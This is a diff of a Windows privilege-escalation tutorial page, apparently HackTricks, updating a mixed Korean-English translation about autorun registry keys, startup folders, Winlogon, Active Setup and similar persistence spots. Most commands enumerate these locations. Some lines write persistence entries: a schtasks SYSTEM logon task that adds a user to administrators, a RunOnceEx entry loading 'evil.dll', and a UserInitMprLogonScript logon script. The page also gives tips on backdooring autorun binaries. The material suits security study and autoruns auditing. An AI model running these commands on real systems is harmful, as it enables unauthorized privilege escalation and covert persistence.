@@ -1,4 +1,4 @@
-# Autoruns를 이용한 권한 상승
+# Privilege Escalation with Autoruns
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -6,14 +6,14 @@
 
 ## WMIC
 
-**Wmic**는 **시작** 시 프로그램을 실행하는 데 사용할 수 있습니다. 시작 시 실행되도록 프로그래밍된 바이너리를 확인하려면:
+**Wmic**는 **startup** 시 프로그램을 실행하는 데 사용할 수 있습니다. 어떤 binary가 startup에서 실행되도록 설정되어 있는지 확인하려면:
 ```bash
 wmic startup get caption,command 2>nul & ^
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
 ```
-## Scheduled Tasks
+## 예약된 작업
 
-**작업**은 **특정 빈도**로 실행되도록 예약할 수 있습니다. 다음 명령어로 실행되도록 예약된 바이너리를 확인하세요:
+**Tasks**는 **특정 빈도**로 실행되도록 예약될 수 있습니다. 실행되도록 예약된 바이너리를 확인하려면:
 ```bash
 schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
 schtasks /query /fo LIST 2>nul | findstr TaskName
@@ -24,9 +24,9 @@ Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,Tas
 #You can also write that content on a bat file that is being executed by a scheduled task
 schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
 ```
-## Folders
+## 폴더
 
-모든 **시작 폴더에 위치한 바이너리 파일은 시작 시 실행됩니다**. 일반적인 시작 폴더는 다음에 나열된 폴더들이지만, 시작 폴더는 레지스트리에 표시됩니다. [여기를 읽어 어디인지 알아보세요.](privilege-escalation-with-autorun-binaries.md#startup-path)
+**Startup folders**에 있는 모든 바이너리는 시작 시 실행됩니다. 일반적인 startup folders는 아래에 나열되어 있지만, startup folder는 registry에 표시됩니다. [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)
 ```bash
 dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
 dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
@@ -35,20 +35,23 @@ dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
 Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
 Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
 ```
-> **참고**: 아카이브 추출 *경로 탐색* 취약점(예: WinRAR에서 7.13 이전에 악용된 CVE-2025-8088)은 **압축 해제 중 이러한 시작 폴더에 페이로드를 직접 배치하는 데 활용될 수 있으며**, 다음 사용자 로그온 시 코드 실행을 초래할 수 있습니다. 이 기술에 대한 심층 분석은 다음을 참조하십시오:
+> **FYI**: Archive extraction *path traversal* vulnerabilities (such as the one abused in WinRAR prior to 7.13 – CVE-2025-8088) can be leveraged to **deposit payloads directly inside these Startup folders during decompression**, resulting in code execution on the next user logon.  For a deep-dive into this technique see:
+
 
 {{#ref}}
 ../../generic-hacking/archive-extraction-path-traversal.md
 {{#endref}}
 
-## 레지스트리
+
+
+## Registry
 
 > [!TIP]
-> [여기에서 참고](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** 레지스트리 항목은 64비트 Windows 버전을 실행하고 있음을 나타냅니다. 운영 체제는 이 키를 사용하여 64비트 Windows 버전에서 실행되는 32비트 응용 프로그램에 대한 HKEY_LOCAL_MACHINE\SOFTWARE의 별도 보기를 표시합니다.
+> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): The **Wow6432Node** registry entry indicates that you are running a 64-bit Windows version. The operating system uses this key to display a separate view of HKEY_LOCAL_MACHINE\SOFTWARE for 32-bit applications that run on 64-bit Windows versions.
 
-### 실행
+### Runs
 
-**일반적으로 알려진** AutoRun 레지스트리:
+**Commonly known** AutoRun registry:
 
 - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
 - `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
@@ -62,9 +65,9 @@ Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
 - `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
 - `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`
 
-**Run** 및 **RunOnce**로 알려진 레지스트리 키는 사용자가 시스템에 로그인할 때마다 프로그램을 자동으로 실행하도록 설계되었습니다. 키의 데이터 값으로 할당된 명령줄은 260자 이하로 제한됩니다.
+Registry keys known as **Run** and **RunOnce** are designed to automatically execute programs every time a user logs into the system. The command line assigned as a key's data value is limited to 260 characters or less.
 
-**서비스 실행** (부팅 중 서비스의 자동 시작을 제어할 수 있음):
+**Service runs** (can control automatic startup of services during boot):
 
 - `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
 - `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
@@ -80,15 +83,15 @@ Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
 - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
 - `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`
 
-Windows Vista 및 이후 버전에서는 **Run** 및 **RunOnce** 레지스트리 키가 자동으로 생성되지 않습니다. 이러한 키의 항목은 프로그램을 직접 시작하거나 종속성으로 지정할 수 있습니다. 예를 들어, 로그온 시 DLL 파일을 로드하려면 **RunOnceEx** 레지스트리 키와 "Depend" 키를 함께 사용할 수 있습니다. 이는 시스템 시작 시 "C:\temp\evil.dll"을 실행하도록 레지스트리 항목을 추가하여 보여줍니다:
+On Windows Vista and later versions, the **Run** and **RunOnce** registry keys are not automatically generated. Entries in these keys can either directly start programs or specify them as dependencies. For instance, to load a DLL file at logon, one could use the **RunOnceEx** registry key along with a "Depend" key. This is demonstrated by adding a registry entry to execute "C:\temp\evil.dll" during the system start-up:
 ```
 reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
 ```
 > [!TIP]
-> **Exploit 1**: **HKLM** 내의 언급된 레지스트리 중 어느 곳에든 쓸 수 있다면, 다른 사용자가 로그인할 때 권한을 상승시킬 수 있습니다.
+> **Exploit 1**: 만약 **HKLM** 안의 언급된 registry 중 어느 하나에라도 write할 수 있다면, 다른 user가 log in할 때 privileges를 escalate할 수 있습니다.
 
 > [!TIP]
-> **Exploit 2**: **HKLM** 내의 레지스트리 중 어느 곳에든 표시된 이진 파일을 덮어쓸 수 있다면, 다른 사용자가 로그인할 때 해당 이진 파일을 백도어로 수정하고 권한을 상승시킬 수 있습니다.
+> **Exploit 2**: 만약 **HKLM** 안의 registry 중 어느 하나에 표시된 binaries를 overwrite할 수 있다면, 다른 user가 log in할 때 그 binary를 backdoor가 포함된 버전으로 modify하고 privileges를 escalate할 수 있습니다.
 ```bash
 #CMD
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
@@ -151,10 +154,10 @@ Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\Ru
 - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
 - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
 
-**Startup** 폴더에 배치된 바로 가기는 사용자 로그온 또는 시스템 재부팅 중에 서비스나 애플리케이션을 자동으로 실행합니다. **Startup** 폴더의 위치는 **Local Machine** 및 **Current User** 범위에 대해 레지스트리에서 정의됩니다. 이는 이러한 지정된 **Startup** 위치에 추가된 모든 바로 가기가 로그온 또는 재부팅 프로세스 후에 연결된 서비스나 프로그램이 시작되도록 보장함을 의미하며, 프로그램을 자동으로 실행하도록 예약하는 간단한 방법입니다.
+**Startup** 폴더에 배치된 바로가기는 사용자 logon 또는 system reboot 동안 서비스나 애플리케이션을 자동으로 실행합니다. **Startup** 폴더의 위치는 **Local Machine**과 **Current User** 범위 모두에 대해 registry에서 정의됩니다. 즉, 이 지정된 **Startup** 위치에 추가된 모든 바로가기는 연결된 service나 program이 logon 또는 reboot 과정 이후 시작되도록 보장하므로, program을 자동 실행하도록 예약하는 매우 간단한 방법입니다.
 
 > [!TIP]
-> **HKLM** 아래의 \[User] Shell Folder를 덮어쓸 수 있다면, 이를 당신이 제어하는 폴더로 지정하고 사용자가 시스템에 로그인할 때마다 실행될 백도어를 배치할 수 있습니다.
+> **HKLM** 아래의 아무 \[User] Shell Folder나 overwrite할 수 있다면, 이를 자신이 제어하는 folder로 지정하고 backdoor를 넣어두어 사용자가 system에 log in할 때마다 실행되게 할 수 있으며, 이로써 privileges를 escalte할 수 있습니다.
 ```bash
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
@@ -166,11 +169,34 @@ Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
 ```
+### UserInitMprLogonScript
+
+- `HKCU\Environment\UserInitMprLogonScript`
+
+이 per-user registry value는 해당 사용자가 로그온할 때 실행되는 script 또는 command를 가리킬 수 있습니다. 이것은 주로 **persistence** primitive인데, 영향을 받는 사용자의 context에서만 실행되기 때문입니다. 하지만 post-exploitation 및 autoruns review 중에는 여전히 확인할 가치가 있습니다.
+
+> [!TIP]
+> 현재 user에 대해 이 value를 쓸 수 있다면, admin rights 없이도 다음 interactive logon 때 실행을 다시 trigger할 수 있습니다. 다른 user hive에 쓸 수 있다면, 그 사용자가 로그온할 때 code execution을 얻을 수 있습니다.
+```bash
+reg query "HKCU\Environment" /v "UserInitMprLogonScript"
+reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
+reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f
+
+Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
+Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
+Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
+```
+Notes:
+
+- 대상 사용자가 이미 읽을 수 있는 `.bat`, `.cmd`, `.ps1`, 또는 다른 launcher 파일의 전체 경로를 선호하세요.
+- 이 값이 제거될 때까지 logoff/reboot 후에도 유지됩니다.
+- `HKLM\...\Run`과 달리, 이것은 그 자체로 elevation을 부여하지 않으며, user-scope persistence입니다.
+
 ### Winlogon Keys
 
 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
 
-일반적으로 **Userinit** 키는 **userinit.exe**로 설정됩니다. 그러나 이 키가 수정되면, 지정된 실행 파일이 사용자 로그온 시 **Winlogon**에 의해 실행됩니다. 유사하게, **Shell** 키는 Windows의 기본 셸인 **explorer.exe**를 가리키도록 설정되어 있습니다.
+일반적으로 **Userinit** 키는 **userinit.exe**로 설정됩니다. 하지만 이 키가 수정되면, 지정된 executable도 사용자 logon 시 **Winlogon**에 의해 함께 실행됩니다. 마찬가지로 **Shell** 키는 **explorer.exe**를 가리키도록 되어 있으며, 이는 Windows의 기본 shell입니다.
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
@@ -178,14 +204,14 @@ Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVers
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
 ```
 > [!TIP]
-> 레지스트리 값을 덮어쓰거나 이진 파일을 덮어쓸 수 있다면 권한을 상승시킬 수 있습니다.
+> 레지스트리 값 또는 binary를 덮어쓸 수 있다면 privileges를 상승시킬 수 있습니다.
 
-### 정책 설정
+### Policy Settings
 
 - `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
 - `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
 
-**실행** 키를 확인하세요.
+**Run** key를 확인하세요.
 ```bash
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
@@ -194,51 +220,51 @@ Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion
 ```
 ### AlternateShell
 
-### 안전 모드 명령 프롬프트 변경
+### Safe Mode Command Prompt 변경
 
-Windows 레지스트리의 `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` 아래에 기본적으로 `cmd.exe`로 설정된 **`AlternateShell`** 값이 있습니다. 이는 시작 시 "명령 프롬프트가 있는 안전 모드"를 선택할 때 (F8을 눌러서) `cmd.exe`가 사용된다는 것을 의미합니다. 그러나 F8을 누르고 수동으로 선택할 필요 없이 이 모드에서 자동으로 시작하도록 컴퓨터를 설정할 수 있습니다.
+Windows Registry의 `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` 아래에는 기본값으로 `cmd.exe`로 설정된 **`AlternateShell`** 값이 있다. 이는 시작 중 "Safe Mode with Command Prompt"를 선택하면(F8 키를 눌러) `cmd.exe`가 사용된다는 뜻이다. 하지만 F8을 누르지 않고 수동 선택도 없이, 컴퓨터가 이 모드로 자동 시작되도록 설정할 수도 있다.
 
-"명령 프롬프트가 있는 안전 모드"에서 자동으로 시작하기 위한 부팅 옵션을 만드는 단계:
+"Safe Mode with Command Prompt"로 자동 시작하는 boot option을 만드는 단계:
 
-1. `boot.ini` 파일의 속성을 변경하여 읽기 전용, 시스템 및 숨김 플래그를 제거합니다: `attrib c:\boot.ini -r -s -h`
-2. 편집을 위해 `boot.ini`를 엽니다.
-3. 다음과 같은 줄을 삽입합니다: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
-4. `boot.ini`에 대한 변경 사항을 저장합니다.
-5. 원래 파일 속성을 다시 적용합니다: `attrib c:\boot.ini +r +s +h`
+1. `boot.ini` 파일의 속성을 변경해 read-only, system, hidden 플래그를 제거한다: `attrib c:\boot.ini -r -s -h`
+2. 편집을 위해 `boot.ini`를 연다.
+3. 다음과 같은 줄을 추가한다: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
+4. `boot.ini`에 변경 사항을 저장한다.
+5. 원래 파일 속성을 다시 적용한다: `attrib c:\boot.ini +r +s +h`
 
-- **Exploit 1:** **AlternateShell** 레지스트리 키를 변경하면 사용자 정의 명령 셸 설정이 가능해져, 무단 접근이 발생할 수 있습니다.
-- **Exploit 2 (PATH 쓰기 권한):** 시스템 **PATH** 변수의 어떤 부분에든 쓰기 권한이 있는 경우, 특히 `C:\Windows\system32` 이전에, 사용자 정의 `cmd.exe`를 실행할 수 있으며, 이는 시스템이 안전 모드에서 시작될 경우 백도어가 될 수 있습니다.
-- **Exploit 3 (PATH 및 boot.ini 쓰기 권한):** `boot.ini`에 대한 쓰기 접근이 가능하면 자동 안전 모드 시작이 가능해져, 다음 재부팅 시 무단 접근을 용이하게 합니다.
+- **Exploit 1:** **AlternateShell** registry key를 변경하면 custom command shell 설정이 가능하며, 이는 unauthorized access로 이어질 수 있다.
+- **Exploit 2 (PATH Write Permissions):** system **PATH** variable의 어떤 부분이든, 특히 `C:\Windows\system32`보다 앞쪽에 write permissions가 있으면 custom `cmd.exe`를 실행할 수 있으며, 시스템이 Safe Mode로 시작될 때 backdoor가 될 수 있다.
+- **Exploit 3 (PATH and boot.ini Write Permissions):** `boot.ini`에 대한 write access가 있으면 자동 Safe Mode 시작이 가능해져, 다음 재부팅 때 unauthorized access를 쉽게 할 수 있다.
 
-현재 **AlternateShell** 설정을 확인하려면 다음 명령을 사용하세요:
+현재 **AlternateShell** 설정을 확인하려면 다음 명령을 사용한다:
 ```bash
 reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
 Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
 ```
-### 설치된 구성 요소
+### Installed Component
 
-Active Setup은 Windows의 기능으로, **바탕 화면 환경이 완전히 로드되기 전에 시작됩니다**. 이는 특정 명령의 실행을 우선시하며, 사용자 로그온이 진행되기 전에 완료되어야 합니다. 이 과정은 Run 또는 RunOnce 레지스트리 섹션과 같은 다른 시작 항목이 트리거되기 전에도 발생합니다.
+Active Setup은 Windows의 기능으로, **desktop environment가 완전히 로드되기 전에 시작**됩니다. 이는 특정 command의 실행을 우선 처리하며, user logon이 진행되기 전에 반드시 완료되어야 합니다. 이 과정은 Run 또는 RunOnce registry 섹션의 startup entry들이 트리거되기 전에도 발생합니다.
 
-Active Setup은 다음 레지스트리 키를 통해 관리됩니다:
+Active Setup은 다음 registry keys를 통해 관리됩니다:
 
 - `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
 - `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
 - `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
 - `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
 
-이 키들 내에는 각 특정 구성 요소에 해당하는 다양한 하위 키가 존재합니다. 특히 관심 있는 키 값은 다음과 같습니다:
+이 keys 안에는 여러 subkey가 있으며, 각각 특정 component에 해당합니다. 특히 관심 있는 key values는 다음과 같습니다:
 
 - **IsInstalled:**
-- `0`은 구성 요소의 명령이 실행되지 않음을 나타냅니다.
-- `1`은 명령이 각 사용자에 대해 한 번 실행됨을 의미하며, 이는 `IsInstalled` 값이 없을 경우의 기본 동작입니다.
-- **StubPath:** Active Setup에 의해 실행될 명령을 정의합니다. 이는 `notepad`를 실행하는 것과 같은 유효한 명령줄일 수 있습니다.
+- `0`은 component의 command가 실행되지 않음을 의미합니다.
+- `1`은 command가 각 user마다 한 번 실행됨을 의미하며, 이는 `IsInstalled` value가 없을 때의 default behavior입니다.
+- **StubPath:** Active Setup이 실행할 command를 정의합니다. `notepad`를 실행하는 것처럼 유효한 command line이면 무엇이든 될 수 있습니다.
 
-**보안 통찰:**
+**Security Insights:**
 
-- **`IsInstalled`**가 `"1"`로 설정된 키를 특정 **`StubPath`**로 수정하거나 쓰는 것은 무단 명령 실행으로 이어질 수 있으며, 이는 권한 상승을 초래할 수 있습니다.
-- 어떤 **`StubPath`** 값에서 참조된 이진 파일을 변경하는 것도 충분한 권한이 주어지면 권한 상승을 달성할 수 있습니다.
+- **`IsInstalled`**가 `"1"`로 설정된 key에 특정 **`StubPath`**와 함께 modify하거나 write하면 unauthorized command execution으로 이어질 수 있으며, potential for privilege escalation이 있습니다.
+- **`StubPath`** value에서 참조되는 binary file을 변경하는 것도 충분한 permissions이 있다면 privilege escalation을 달성할 수 있습니다.
 
-Active Setup 구성 요소 전반에 걸쳐 **`StubPath`** 구성을 검사하기 위해 다음 명령을 사용할 수 있습니다:
+**`StubPath`** configurations across Active Setup components를 확인하려면 다음 commands를 사용할 수 있습니다:
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
 reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
@@ -247,32 +273,32 @@ reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components
 ```
 ### Browser Helper Objects
 
-### Overview of Browser Helper Objects (BHOs)
+### Browser Helper Objects (BHOs) 개요
 
-Browser Helper Objects (BHOs)는 Microsoft의 Internet Explorer에 추가 기능을 제공하는 DLL 모듈입니다. 이들은 매번 시작할 때 Internet Explorer와 Windows Explorer에 로드됩니다. 그러나 **NoExplorer** 키를 1로 설정하면 실행이 차단되어 Windows Explorer 인스턴스와 함께 로드되지 않도록 할 수 있습니다.
+Browser Helper Objects (BHOs)는 Microsoft Internet Explorer에 추가 기능을 더하는 DLL 모듈입니다. 이들은 Internet Explorer와 Windows Explorer가 시작될 때마다 로드됩니다. 다만 **NoExplorer** 키를 1로 설정하면 실행이 차단되어 Windows Explorer 인스턴스와 함께 로드되지 않게 할 수 있습니다.
 
 BHOs는 Internet Explorer 11을 통해 Windows 10과 호환되지만, 최신 버전의 Windows에서 기본 브라우저인 Microsoft Edge에서는 지원되지 않습니다.
 
-시스템에 등록된 BHOs를 탐색하려면 다음 레지스트리 키를 검사할 수 있습니다:
+시스템에 등록된 BHOs를 확인하려면 다음 registry key를 검사할 수 있습니다:
 
 - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
 - `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
 
-각 BHO는 레지스트리에서 고유 식별자로서 **CLSID**로 표시됩니다. 각 CLSID에 대한 자세한 정보는 `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` 아래에서 찾을 수 있습니다.
+각 BHO는 registry에서 **CLSID**로 표현되며, 이는 고유 식별자 역할을 합니다. 각 CLSID에 대한 자세한 정보는 `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` 아래에서 찾을 수 있습니다.
 
-레지스트리에서 BHOs를 쿼리하기 위해 다음 명령을 사용할 수 있습니다:
+registry에서 BHOs를 조회하려면 다음 명령을 사용할 수 있습니다:
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
 reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
 ```
-### Internet Explorer 확장
+### Internet Explorer Extensions
 
 - `HKLM\Software\Microsoft\Internet Explorer\Extensions`
 - `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`
 
-레지스트리에는 각 dll마다 1개의 새로운 레지스트리가 포함되며, 이는 **CLSID**로 표시됩니다. CLSID 정보는 `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`에서 찾을 수 있습니다.
+registry는 각 dll마다 1개의 새로운 registry를 포함하며, 이는 **CLSID**로 표시됩니다. CLSID 정보는 `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`에서 찾을 수 있습니다.
 
-### 글꼴 드라이버
+### Font Drivers
 
 - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
 - `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
@@ -292,27 +318,29 @@ reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
 ```
-### 이미지 파일 실행 옵션
+### Image File Execution Options
 ```
 HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
 HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
 ```
 ## SysInternals
 
-모든 autoruns를 찾을 수 있는 사이트는 **이미**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)로 검색되었습니다. 그러나 **더 포괄적인 자동 실행** 파일 목록을 원하신다면 Sysinternals의 [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)를 사용할 수 있습니다:
+autoruns를 찾을 수 있는 모든 위치는 [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)에 의해 **이미 검색됩니다**. 하지만 **더 포괄적인 자동 실행** 파일 목록이 필요하다면 sysinternals의 [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)를 사용할 수 있습니다:
 ```
 autorunsc.exe -m -nobanner -a * -ct /accepteula
 ```
 ## More
 
-**레지스트리와 같은 Autoruns를 더 찾으세요** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
+**[**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)**에서 Autoruns 같은 registries를 더 찾아보세요
 
 ## References
 
 - [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
 - [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
+- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
 - [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
 - [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
+- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
 
 
 
